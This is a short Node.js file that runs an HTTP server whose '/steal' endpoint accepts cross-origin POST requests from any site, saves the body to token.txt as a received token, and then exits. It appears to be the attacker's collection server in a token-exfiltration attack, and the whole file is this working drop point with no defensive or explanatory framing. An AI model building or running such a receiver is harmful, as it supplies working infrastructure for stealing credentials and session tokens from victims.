import http from 'http';
import fs from 'fs';

const server = http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  
  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    return res.end();
  }
  
  if (req.url === '/steal' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk.toString());
    req.on('end', () => {
      fs.writeFileSync('token.txt', body);
      console.log('Token received and saved to token.txt!');
      res.writeHead(200);
      res.end('OK');
      process.exit(0); // Exit once received
    });
  } else {
    res.writeHead(404);
    res.end();
  }
});

server.listen(4000, () => console.log('Receiver listening on 4000'));
